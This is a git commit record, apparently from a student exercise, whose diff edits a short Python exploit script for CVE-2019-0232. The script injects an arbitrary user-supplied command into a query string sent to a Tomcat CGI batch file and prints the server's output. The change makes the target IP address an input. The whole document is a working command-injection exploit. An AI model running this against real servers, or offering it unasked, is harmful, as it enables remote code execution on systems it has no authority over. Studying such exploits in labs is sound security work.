ad5d0b268da7a77088bd2bb9b99cbdf7ff722ba1
Parth Thakker <parth_thakker@hotmail.com>
2021-03-26 17:14:09 +0530

    CVE-2019-0232

--- q5.py
+++ q5.py
@@ -2,8 +2,9 @@ import requests
 
 batch_file = input("Enter the name of the batch file on the server\t")
 command = input("Enter the command to be executed\t")
+ip = input("Enter the ip address\t")
 
-url = 'http://192.168.29.118:8080/cgi/' + batch_file + '?&' + command
+url = 'http://' + ip + '/cgi/' + batch_file + '?&' + command
 r = requests.get(url)
 print("Respone from server:")
 print(r.text)
